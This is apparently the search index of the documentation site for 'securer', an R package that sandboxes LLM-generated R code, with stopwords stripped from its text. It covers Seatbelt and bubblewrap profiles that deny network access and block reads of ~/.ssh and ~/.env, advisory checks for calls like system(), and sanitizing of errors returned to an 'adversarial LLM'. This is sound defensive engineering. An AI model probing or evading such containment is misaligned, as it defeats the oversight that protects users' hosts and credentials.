string.","code":""},{"path":"https://ian-flores.github.io/securer/reference/generate_bwrap_args.html","id":null,"dir":"Reference","previous_headings":"","what":"Generate bubblewrap CLI arguments for the sandboxed R session — generate_bwrap_args","title":"Generate bubblewrap CLI arguments for the sandboxed R session — generate_bwrap_args","text":"Creates character vector bwrap arguments : Isolates namespaces (PID, net, user, mount, UTS, IPC) Bind-mounts system libraries R read-Provides clean writable /tmp UDS socket overlaid Blocks network access via namespace isolation","code":""},{"path":"https://ian-flores.github.io/securer/reference/generate_bwrap_args.html","id":"ref-usage","dir":"Reference","previous_headings":"","what":"Usage","title":"Generate bubblewrap CLI arguments for the sandboxed R session — generate_bwrap_args","text":"","code":"generate_bwrap_args(socket_path, r_home)"},{"path":"https://ian-flores.github.io/securer/reference/generate_bwrap_args.html","id":"arguments","dir":"Reference","previous_headings":"","what":"Arguments","title":"Generate bubblewrap CLI arguments for the sandboxed R session — generate_bwrap_args","text":"socket_path Path UDS socket r_home Path R installation","code":""},{"path":"https://ian-flores.github.io/securer/reference/generate_bwrap_args.html","id":"value","dir":"Reference","previous_headings":"","what":"Value","title":"Generate bubblewrap CLI arguments for the sandboxed R session — generate_bwrap_args","text":"character vector bwrap CLI arguments","code":""},{"path":"https://ian-flores.github.io/securer/reference/generate_seatbelt_profile.html","id":null,"dir":"Reference","previous_headings":"","what":"Generate a macOS Seatbelt profile for the sandboxed R session — generate_seatbelt_profile","title":"Generate a macOS Seatbelt profile for the sandboxed R session — generate_seatbelt_profile","text":"Creates Seatbelt policy string : Denies operations default Allows file reads R installation, library paths, system libraries, temp directories (blocks ~/.ssh, ~/.env, etc.) Allows file writes temp directory (UDS + R temp files) Allows Unix domain socket operations (IPC parent) Denies remote network access (TCP/UDP) Allows process-fork process-exec R binary Allows specific system operations R needs","code":""},{"path":"https://ian-flores.github.io/securer/reference/generate_seatbelt_profile.html","id":"ref-usage","dir":"Reference","previous_headings":"","what":"Usage","title":"Generate a macOS Seatbelt profile for the sandboxed R session — generate_seatbelt_profile","text":"","code":"generate_seatbelt_profile(socket_path, r_home, lib_paths = .libPaths())"},{"path":"https://ian-flores.github.io/securer/reference/generate_seatbelt_profile.html","id":"arguments","dir":"Reference","previous_headings":"","what":"Arguments","title":"Generate a macOS Seatbelt profile for the sandboxed R session — generate_seatbelt_profile","text":"socket_path Path UDS socket r_home Path R installation lib_paths Character vector R library paths (default: .libPaths())","code":""},{"path":"https://ian-flores.github.io/securer/reference/generate_seatbelt_profile.html","id":"value","dir":"Reference","previous_headings":"","what":"Value","title":"Generate a macOS Seatbelt profile for the sandboxed R session — generate_seatbelt_profile","text":"single character string containing Seatbelt profile","code":""},{"path":"https://ian-flores.github.io/securer/reference/generate_tool_wrappers.html","id":null,"dir":"Reference","previous_headings":"","what":"Generate wrapper code for tools in the child process — generate_tool_wrappers","title":"Generate wrapper code for tools in the child process — generate_tool_wrappers","text":"securer_tool() object, generates R function child's global environment delegates .securer_call_tool() tool name arguments.","code":""},{"path":"https://ian-flores.github.io/securer/reference/generate_tool_wrappers.html","id":"ref-usage","dir":"Reference","previous_headings":"","what":"Usage","title":"Generate wrapper code for tools in the child process — generate_tool_wrappers","text":"","code":"generate_tool_wrappers(tools)"},{"path":"https://ian-flores.github.io/securer/reference/generate_tool_wrappers.html","id":"arguments","dir":"Reference","previous_headings":"","what":"Arguments","title":"Generate wrapper code for tools in the child process — generate_tool_wrappers","text":"tools List securer_tool objects","code":""},{"path":"https://ian-flores.github.io/securer/reference/generate_tool_wrappers.html","id":"value","dir":"Reference","previous_headings":"","what":"Value","title":"Generate wrapper code for tools in the child process — generate_tool_wrappers","text":"Character string R code creates wrapper functions","code":""},{"path":"https://ian-flores.github.io/securer/reference/generate_type_checks.html","id":null,"dir":"Reference","previous_headings":"","what":"Generate type validation code for tool arguments — generate_type_checks","title":"Generate type validation code for tool arguments — generate_type_checks","text":"Produces R code character string checks argument's type declared type annotation. Arguments without type annotations skipped.","code":""},{"path":"https://ian-flores.github.io/securer/reference/generate_type_checks.html","id":"ref-usage","dir":"Reference","previous_headings":"","what":"Usage","title":"Generate type validation code for tool arguments — generate_type_checks","text":"","code":"generate_type_checks(tool_name, args)"},{"path":"https://ian-flores.github.io/securer/reference/generate_type_checks.html","id":"arguments","dir":"Reference","previous_headings":"","what":"Arguments","title":"Generate type validation code for tool arguments — generate_type_checks","text":"tool_name Character, tool name (error messages) args Named list mapping argument names type strings","code":""},{"path":"https://ian-flores.github.io/securer/reference/generate_type_checks.html","id":"value","dir":"Reference","previous_headings":"","what":"Value","title":"Generate type validation code for tool arguments — generate_type_checks","text":"Character string R code performing type checks (may empty)","code":""},{"path":"https://ian-flores.github.io/securer/reference/generate_ulimit_commands.html","id":null,"dir":"Reference","previous_headings":"","what":"Generate ulimit shell commands from a limits list — generate_ulimit_commands","title":"Generate ulimit shell commands from a limits list — generate_ulimit_commands","text":"Translates user-facing limits list shell ulimit commands can injected wrapper scripts exec line.","code":""},{"path":"https://ian-flores.github.io/securer/reference/generate_ulimit_commands.html","id":"ref-usage","dir":"Reference","previous_headings":"","what":"Usage","title":"Generate ulimit shell commands from a limits list — generate_ulimit_commands","text":"","code":"generate_ulimit_commands(limits)"},{"path":"https://ian-flores.github.io/securer/reference/generate_ulimit_commands.html","id":"arguments","dir":"Reference","previous_headings":"","what":"Arguments","title":"Generate ulimit shell commands from a limits list — generate_ulimit_commands","text":"limits named list resource limits, NULL limits.","code":""},{"path":"https://ian-flores.github.io/securer/reference/generate_ulimit_commands.html","id":"value","dir":"Reference","previous_headings":"","what":"Value","title":"Generate ulimit shell commands from a limits list — generate_ulimit_commands","text":"character vector shell commands (one per limit), character(0) limits NULL empty.","code":""},{"path":"https://ian-flores.github.io/securer/reference/generate_ulimit_commands.html","id":"details","dir":"Reference","previous_headings":"","what":"Details","title":"Generate ulimit shell commands from a limits list — generate_ulimit_commands","text":"Supported limit names: cpu CPU time seconds (ulimit -t) memory Virtual memory (address space) bytes (ulimit -v). Converted kilobytes ulimit. fsize Maximum file size bytes (ulimit -f). Converted 512-byte blocks ulimit. nproc Maximum number processes (ulimit -u) nofile Maximum number open files (ulimit -n) stack Maximum stack size bytes (ulimit -s). Converted kilobytes ulimit.","code":""},{"path":"https://ian-flores.github.io/securer/reference/ipc_accept.html","id":null,"dir":"Reference","previous_headings":"","what":"Accept a client connection on a Unix domain socket server — ipc_accept","title":"Accept a client connection on a Unix domain socket server — ipc_accept","text":"Polls server connection accepts incoming client. Note: processx::conn_accept_unix_socket() transitions server connection \"connected_server\" state. calling , server_conn object used bidirectional data transfer.","code":""},{"path":"https://ian-flores.github.io/securer/reference/ipc_accept.html","id":"ref-usage","dir":"Reference","previous_headings":"","what":"Usage","title":"Accept a client connection on a Unix domain socket server — ipc_accept","text":"","code":"ipc_accept(server_conn, timeout = 5000L)"},{"path":"https://ian-flores.github.io/securer/reference/ipc_accept.html","id":"arguments","dir":"Reference","previous_headings":"","what":"Arguments","title":"Accept a client connection on a Unix domain socket server — ipc_accept","text":"server_conn server connection returned ipc_create_server() timeout Timeout milliseconds (default 5000)","code":""},{"path":"https://ian-flores.github.io/securer/reference/ipc_accept.html","id":"value","dir":"Reference","previous_headings":"","what":"Value","title":"Accept a client connection on a Unix domain socket server — ipc_accept","text":"Invisible NULL; server_conn modified place","code":""},{"path":"https://ian-flores.github.io/securer/reference/ipc_create_server.html","id":null,"dir":"Reference","previous_headings":"","what":"Create a Unix domain socket server — ipc_create_server","title":"Create a Unix domain socket server — ipc_create_server","text":"Create Unix domain socket server","code":""},{"path":"https://ian-flores.github.io/securer/reference/ipc_create_server.html","id":"ref-usage","dir":"Reference","previous_headings":"","what":"Usage","title":"Create a Unix domain socket server — ipc_create_server","text":"","code":"ipc_create_server(path)"},{"path":"https://ian-flores.github.io/securer/reference/ipc_create_server.html","id":"arguments","dir":"Reference","previous_headings":"","what":"Arguments","title":"Create a Unix domain socket server — ipc_create_server","text":"path Character string, file path socket","code":""},{"path":"https://ian-flores.github.io/securer/reference/ipc_create_server.html","id":"value","dir":"Reference","previous_headings":"","what":"Value","title":"Create a Unix domain socket server — ipc_create_server","text":"server connection object processx","code":""},{"path":"https://ian-flores.github.io/securer/reference/ipc_read_message.html","id":null,"dir":"Reference","previous_headings":"","what":"Read a message from an IPC connection — ipc_read_message","title":"Read a message from an IPC connection — ipc_read_message","text":"Reads single newline-terminated JSON line connection, timeout. Returns parsed list. Raises error timeout.","code":""},{"path":"https://ian-flores.github.io/securer/reference/ipc_read_message.html","id":"ref-usage","dir":"Reference","previous_headings":"","what":"Usage","title":"Read a message from an IPC connection — ipc_read_message","text":"","code":"ipc_read_message(conn, timeout = 30000L)"},{"path":"https://ian-flores.github.io/securer/reference/ipc_read_message.html","id":"arguments","dir":"Reference","previous_headings":"","what":"Arguments","title":"Read a message from an IPC connection — ipc_read_message","text":"conn connection object timeout Timeout milliseconds (default 30000)","code":""},{"path":"https://ian-flores.github.io/securer/reference/ipc_read_message.html","id":"value","dir":"Reference","previous_headings":"","what":"Value","title":"Read a message from an IPC connection — ipc_read_message","text":"parsed list JSON message","code":""},{"path":"https://ian-flores.github.io/securer/reference/ipc_write_message.html","id":null,"dir":"Reference","previous_headings":"","what":"Write a message to an IPC connection — ipc_write_message","title":"Write a message to an IPC connection — ipc_write_message","text":"Serializes list JSON writes single newline-terminated line.","code":""},{"path":"https://ian-flores.github.io/securer/reference/ipc_write_message.html","id":"ref-usage","dir":"Reference","previous_headings":"","what":"Usage","title":"Write a message to an IPC connection — ipc_write_message","text":"","code":"ipc_write_message(conn, msg)"},{"path":"https://ian-flores.github.io/securer/reference/ipc_write_message.html","id":"arguments","dir":"Reference","previous_headings":"","what":"Arguments","title":"Write a message to an IPC connection — ipc_write_message","text":"conn connection object msg list serialize send","code":""},{"path":"https://ian-flores.github.io/securer/reference/ipc_write_message.html","id":"value","dir":"Reference","previous_headings":"","what":"Value","title":"Write a message to an IPC connection — ipc_write_message","text":"Invisible NULL; called side effect writing connection.","code":""},{"path":"https://ian-flores.github.io/securer/reference/sanitize_error_message.html","id":null,"dir":"Reference","previous_headings":"","what":"Sanitize error messages before returning to LLM — sanitize_error_message","title":"Sanitize error messages before returning to LLM — sanitize_error_message","text":"Removes sensitive information R error messages leak host details adversarial LLM. Replaces file paths, hostnames/IPs, process IDs, stack traces preserving core error type.","code":""},{"path":"https://ian-flores.github.io/securer/reference/sanitize_error_message.html","id":"ref-usage","dir":"Reference","previous_headings":"","what":"Usage","title":"Sanitize error messages before returning to LLM — sanitize_error_message","text":"","code":"sanitize_error_message(msg, max_length = 500L)"},{"path":"https://ian-flores.github.io/securer/reference/sanitize_error_message.html","id":"arguments","dir":"Reference","previous_headings":"","what":"Arguments","title":"Sanitize error messages before returning to LLM — sanitize_error_message","text":"msg Character string error message sanitize. max_length Maximum length returned message. Defaults 500.","code":""},{"path":"https://ian-flores.github.io/securer/reference/sanitize_error_message.html","id":"value","dir":"Reference","previous_headings":"","what":"Value","title":"Sanitize error messages before returning to LLM — sanitize_error_message","text":"sanitized character string.","code":""},{"path":"https://ian-flores.github.io/securer/reference/securer-package.html","id":null,"dir":"Reference","previous_headings":"","what":"securer: Secure R Code Execution with Tool-Call IPC — securer-package","title":"securer: Secure R Code Execution with Tool-Call IPC — securer-package","text":"Wraps callr::r_session bidirectional IPC protocol pause/resume tool calls, enabling safe execution LLM-generated R code inside OS-level sandbox. main entry points : execute_r() – convenience function one-shot execution SecureSession – R6 class persistent sessions tool support securer_tool() – define tools child code can call","code":""},{"path":[]},{"path":"https://ian-flores.github.io/securer/reference/securer-package.html","id":"author","dir":"Reference","previous_headings":"","what":"Author","title":"securer: Secure R Code Execution with Tool-Call IPC — securer-package","text":"Maintainer: Ian Flores Siaca iflores.siaca@hey.com","code":""},{"path":"https://ian-flores.github.io/securer/reference/securer_as_ellmer_tool.html","id":null,"dir":"Reference","previous_headings":"","what":"Create an ellmer tool for secure R code execution — securer_as_ellmer_tool","title":"Create an ellmer tool for secure R code execution — securer_as_ellmer_tool","text":"Wraps SecureSession ellmer::tool() definition LLM can execute R code sandboxed environment. tool accepts single code argument (string R code) returns result.","code":""},{"path":"https://ian-flores.github.io/securer/reference/securer_as_ellmer_tool.html","id":"ref-usage","dir":"Reference","previous_headings":"","what":"Usage","title":"Create an ellmer tool for secure R code execution — securer_as_ellmer_tool","text":"","code":"securer_as_ellmer_tool(   session = NULL,   tools = list(),   sandbox = TRUE,   limits = NULL,   timeout = 30 )"},{"path":"https://ian-flores.github.io/securer/reference/securer_as_ellmer_tool.html","id":"arguments","dir":"Reference","previous_headings":"","what":"Arguments","title":"Create an ellmer tool for secure R code execution — securer_as_ellmer_tool","text":"session SecureSession object. NULL (default), new session created given tools, sandbox, limits arguments. supply session, arguments ignored. tools list securer_tool() objects register session. used session NULL. sandbox Logical, whether enable OS-level sandboxing. used session NULL. Defaults TRUE. limits Optional named list resource limits. used session NULL. timeout Timeout seconds code execution, NULL timeout. Defaults 30.","code":""},{"path":"https://ian-flores.github.io/securer/reference/securer_as_ellmer_tool.html","id":"value","dir":"Reference","previous_headings":"","what":"Value","title":"Create an ellmer tool for secure R code execution — securer_as_ellmer_tool","text":"ellmer ToolDef object can registered chat$register_tool().","code":""},{"path":"https://ian-flores.github.io/securer/reference/securer_as_ellmer_tool.html","id":"ref-examples","dir":"Reference","previous_headings":"","what":"Examples","title":"Create an ellmer tool for secure R code execution — securer_as_ellmer_tool","text":"","code":"if (FALSE) { # \\dontrun{ library(ellmer)  # Basic usage: LLM can execute R code in a sandbox chat <- chat_openai() chat$register_tool(securer_as_ellmer_tool()) chat$chat(\"What is the mean of the numbers 1 through 100?\")  # With custom tools available inside the sandbox tools <- list(   securer_tool(\"fetch_data\", \"Fetch a dataset by name\",     fn = function(name) get(name, \"package:datasets\"),     args = list(name = \"character\")) ) chat$register_tool(securer_as_ellmer_tool(tools = tools)) chat$chat(\"Load the mtcars dataset and compute the mean mpg.\")  # With a pre-existing session session <- SecureSession$new(sandbox = TRUE) chat$register_tool(securer_as_ellmer_tool(session = session)) # ... use chat ... session$close() } # }"},{"path":"https://ian-flores.github.io/securer/reference/securer_tool.html","id":null,"dir":"Reference","previous_headings":"","what":"Create a tool definition — securer_tool","title":"Create a tool definition — securer_tool","text":"Defines named tool function implementation typed argument metadata. Tool objects passed SecureSession execute_r() code running sandboxed child process can call tool name parent process executes actual function.","code":""},{"path":"https://ian-flores.github.io/securer/reference/securer_tool.html","id":"ref-usage","dir":"Reference","previous_headings":"","what":"Usage","title":"Create a tool definition — securer_tool","text":"","code":"securer_tool(name, description, fn, args = list())"},{"path":"https://ian-flores.github.io/securer/reference/securer_tool.html","id":"arguments","dir":"Reference","previous_headings":"","what":"Arguments","title":"Create a tool definition — securer_tool","text":"name Character, tool name (must non-empty). description Character, description tool . fn Function implements tool. args Named list mapping argument names type strings (e.g. list(city = \"character\")). Used generate wrapper functions child process correct formal arguments.","code":""},{"path":"https://ian-flores.github.io/securer/reference/securer_tool.html","id":"value","dir":"Reference","previous_headings":"","what":"Value","title":"Create a tool definition — securer_tool","text":"securer_tool object (list class \"securer_tool\").","code":""},{"path":"https://ian-flores.github.io/securer/reference/securer_tool.html","id":"ref-examples","dir":"Reference","previous_headings":"","what":"Examples","title":"Create a tool definition — securer_tool","text":"","code":"tool <- securer_tool(   \"add\", \"Add two numbers\",   fn = function(a, b) a + b,   args = list(a = \"numeric\", b = \"numeric\") ) tool$name #> [1] \"add\" # \"add\""},{"path":"https://ian-flores.github.io/securer/reference/type_check_map.html","id":null,"dir":"Reference","previous_headings":"","what":"Map of type annotation strings to R type-checking functions — type_check_map","title":"Map of type annotation strings to R type-checking functions — type_check_map","text":"Map type annotation strings R type-checking functions","code":""},{"path":"https://ian-flores.github.io/securer/reference/type_check_map.html","id":"ref-usage","dir":"Reference","previous_headings":"","what":"Usage","title":"Map of type annotation strings to R type-checking functions — type_check_map","text":"","code":"type_check_map"},{"path":"https://ian-flores.github.io/securer/reference/type_check_map.html","id":"format","dir":"Reference","previous_headings":"","what":"Format","title":"Map of type annotation strings to R type-checking functions — type_check_map","text":"object class character length 6.","code":""},{"path":"https://ian-flores.github.io/securer/reference/validate_code.html","id":null,"dir":"Reference","previous_headings":"","what":"Validate R code before execution — validate_code","title":"Validate R code before execution — validate_code","text":"Parses code string catch syntax errors optionally checks potentially dangerous function calls.  intended fast pre-check obviously broken code never reaches child process.","code":""},{"path":"https://ian-flores.github.io/securer/reference/validate_code.html","id":"ref-usage","dir":"Reference","previous_headings":"","what":"Usage","title":"Validate R code before execution — validate_code","text":"","code":"validate_code(code)"},{"path":"https://ian-flores.github.io/securer/reference/validate_code.html","id":"arguments","dir":"Reference","previous_headings":"","what":"Arguments","title":"Validate R code before execution — validate_code","text":"code Character string R code validate.","code":""},{"path":"https://ian-flores.github.io/securer/reference/validate_code.html","id":"value","dir":"Reference","previous_headings":"","what":"Value","title":"Validate R code before execution — validate_code","text":"list components: valid Logical. TRUE code parses without error. error NULL success, character string describing parse error. warnings Character vector advisory warnings potentially dangerous patterns (e.g. system(), .Internal()).  Empty none detected.  advisory — sandbox handles actual restriction.","code":""},{"path":"https://ian-flores.github.io/securer/reference/validate_code.html","id":"details","dir":"Reference","previous_headings":"","what":"Details","title":"Validate R code before execution — validate_code","text":"Note: Pattern-based validation ADVISORY .  uses simple regex matching can produce false positives false negatives. OS-level sandbox (Seatbelt / bwrap) actual enforcement layer restricts filesystem, network, process access.  rely validation alone prevent dangerous operations.","code":""},{"path":"https://ian-flores.github.io/securer/reference/validate_code.html","id":"ref-examples","dir":"Reference","previous_headings":"","what":"Examples","title":"Validate R code before execution — validate_code","text":"","code":"# Valid code result <- validate_code(\"1 + 1\") result$valid #> [1] TRUE # TRUE  # Syntax error result <- validate_code(\"if (TRUE {\") result$valid #> [1] FALSE # FALSE result$error #> [1] \"<text>:1:10: unexpected '{'\\n1: if (TRUE {\\n             ^\"  # Dangerous pattern warning result <- validate_code(\"system('ls')\") result$warnings #> [1] \"Code contains call to `system()` which may be restricted by the sandbox\""},{"path":"https://ian-flores.github.io/securer/reference/validate_limits.html","id":null,"dir":"Reference","previous_headings":"","what":"Validate a limits list — validate_limits","title":"Validate a limits list — validate_limits","text":"Checks limit names recognized values positive numbers.","code":""},{"path":"https://ian-flores.github.io/securer/reference/validate_limits.html","id":"ref-usage","dir":"Reference","previous_headings":"","what":"Usage","title":"Validate a limits list — validate_limits","text":"","code":"validate_limits(limits)"},{"path":"https://ian-flores.github.io/securer/reference/validate_limits.html","id":"arguments","dir":"Reference","previous_headings":"","what":"Arguments","title":"Validate a limits list — validate_limits","text":"limits named list resource limits.","code":""},{"path":"https://ian-flores.github.io/securer/reference/validate_limits.html","id":"value","dir":"Reference","previous_headings":"","what":"Value","title":"Validate a limits list — validate_limits","text":"Invisible NULL; raises error invalid input.","code":""},{"path":"https://ian-flores.github.io/securer/reference/validate_tools.html","id":null,"dir":"Reference","previous_headings":"","what":"Validate a list of tools — validate_tools","title":"Validate a list of tools — validate_tools","text":"Accepts either named list bare functions (legacy format increment 1) list securer_tool() objects. Returns named list two components: fns (tool functions keyed name) arg_meta (expected argument names keyed tool name).","code":""},{"path":"https://ian-flores.github.io/securer/reference/validate_tools.html","id":"ref-usage","dir":"Reference","previous_headings":"","what":"Usage","title":"Validate a list of tools — validate_tools","text":"","code":"validate_tools(tools)"},{"path":"https://ian-flores.github.io/securer/reference/validate_tools.html","id":"arguments","dir":"Reference","previous_headings":"","what":"Arguments","title":"Validate a list of tools — validate_tools","text":"tools List securer_tool objects named list functions","code":""},{"path":"https://ian-flores.github.io/securer/reference/validate_tools.html","id":"value","dir":"Reference","previous_headings":"","what":"Value","title":"Validate a list of tools — validate_tools","text":"list fns (named list functions) arg_meta (named list character vectors expected arg names, NULL legacy tools without metadata)","code":""},{"path":"https://ian-flores.github.io/securer/reference/windows_supported_limits.html","id":null,"dir":"Reference","previous_headings":"","what":"Windows-supported resource limit names — windows_supported_limits","title":"Windows-supported resource limit names — windows_supported_limits","text":"Returns limit names can enforced Windows via Job Objects.","code":""},{"path":"https://ian-flores.github.io/securer/reference/windows_supported_limits.html","id":"ref-usage","dir":"Reference","previous_headings":"","what":"Usage","title":"Windows-supported resource limit names — windows_supported_limits","text":"","code":"windows_supported_limits()"},{"path":"https://ian-flores.github.io/securer/reference/windows_supported_limits.html","id":"value","dir":"Reference","previous_headings":"","what":"Value","title":"Windows-supported resource limit names — windows_supported_limits","text":"character vector supported limit names.","code":""},{"path":"https://ian-flores.github.io/securer/news/index.html","id":"securer-010","dir":"Changelog","previous_headings":"","what":"securer 0.1.0","title":"securer 0.1.0","text":"Initial release.","code":""},{"path":"https://ian-flores.github.io/securer/news/index.html","id":"core-features-0-1-0","dir":"Changelog","previous_headings":"","what":"Core Features","title":"securer 0.1.0","text":"SecureSession R6 class persistent sandboxed R sessions tool-call IPC Unix domain sockets. SecureSessionPool pre-warmed session pools automatic dead-session recovery. execute_r() convenience function one-shot sandboxed execution. securer_tool() defining typed tool functions runtime argument validation. validate_code() pre-execution syntax checking dangerous pattern detection. default_limits() inspecting customizing resource limit defaults.","code":""},{"path":"https://ian-flores.github.io/securer/news/index.html","id":"session-ergonomics-0-1-0","dir":"Changelog","previous_headings":"","what":"Session Ergonomics","title":"securer 0.1.0","text":"$restart() method explicitly restart dead stuck child process. $tools() accessor inspect registered tools argument specs. print()/format() methods SecureSession SecureSessionPool. sandbox_strict parameter error sandbox tools unavailable instead silently falling back unsandboxed execution.","code":""},{"path":"https://ian-flores.github.io/securer/news/index.html","id":"sandbox-support-0-1-0","dir":"Changelog","previous_headings":"","what":"Sandbox Support","title":"securer 0.1.0","text":"macOS: Full OS-level sandbox via Seatbelt (sandbox-exec) - filesystem writes blocked, network denied, reads restricted R libraries. Linux: Full namespace isolation via bubblewrap (bwrap) - read-mounts, network namespace isolation, /tmp-writes. Windows: Environment variable isolation (clean HOME, empty R_LIBS_USER) plus Job Object resource limits (memory, CPU time, process count) via PowerShell.","code":""},{"path":"https://ian-flores.github.io/securer/news/index.html","id":"resource-controls-0-1-0","dir":"Changelog","previous_headings":"","what":"Resource Controls","title":"securer 0.1.0","text":"ulimit-based resource limits Unix: CPU time, memory, file size, process count, open files, stack size. Windows Job Object limits: memory, CPU time, active process count. Execution timeouts automatic session recovery. Concurrent execution guard preventing parallel $execute() session.","code":""},{"path":"https://ian-flores.github.io/securer/news/index.html","id":"security-hardening-0-1-0","dir":"Changelog","previous_headings":"","what":"Security Hardening","title":"securer 0.1.0","text":"IPC token authentication Unix domain sockets using cryptographic randomness (/dev/urandom Unix, sample() fallback Windows). Closure-based UDS connection hiding child process — connection object invisible child code (global .securer_env). unlockBinding shadowed child prevent tampering locked bindings. SECURER_TOKEN SECURER_SOCKET environment variables cleared authentication child code read credentials. macOS Seatbelt profile hardened: /bin/bash removed allowed executables, /opt/homebrew narrowed lib/Cellar/opt, /dev restricted specific device nodes, mach*/iokit*/sysctl* scoped least-privilege operations. Socket directory enforced 0700 permissions (immune umask). Wrapper scripts Seatbelt profiles set owner-(0700/0600). IPC rate limiting prevent message flood attacks. Unknown IPC message types logged warnings. Tool name regex validation .Deprecated() warning legacy tool format. Zero-argument tools reject unexpected arguments. R_LIBS R_LIBS_USER excluded child environment allowlist prevent library injection via .onLoad hooks. Audit log path validated symlinks, device files, path traversal. Audit log code field truncated prevent unbounded growth. Audit log files created 0600 permissions. Audit log tool results include truncated return value summary forensics. output_handler validated upfront wrapped tryCatch prevent handler errors corrupting session state. Tool error messages sanitized returning child process (strips file paths, PIDs, IPs, stack traces). Windows sandbox emits explicit warning limited isolation scope. Session pool size capped 100 prevent resource exhaustion.","code":""},{"path":"https://ian-flores.github.io/securer/news/index.html","id":"integrations-0-1-0","dir":"Changelog","previous_headings":"","what":"Integrations","title":"securer 0.1.0","text":"securer_as_ellmer_tool() using securer code execution tool ellmer LLM chats. Error messages sanitized returning LLM (strips file paths, PIDs, hostnames, stack traces).","code":""},{"path":"https://ian-flores.github.io/securer/news/index.html","id":"observability-0-1-0","dir":"Changelog","previous_headings":"","what":"Observability","title":"securer 0.1.0","text":"File-based JSONL audit logging session lifecycle, tool calls (truncated result summaries), execution events. Logs validated created restrictive file permissions. SecureSessionPool$status() method returning total/busy/idle/dead counts. $execute(acquire_timeout = N) session pool configurable wait time. Verbose message() logging debugging (tool call timing, lifecycle events). Streaming output capture child cat()/print() via piped stdout/stderr.","code":""}]
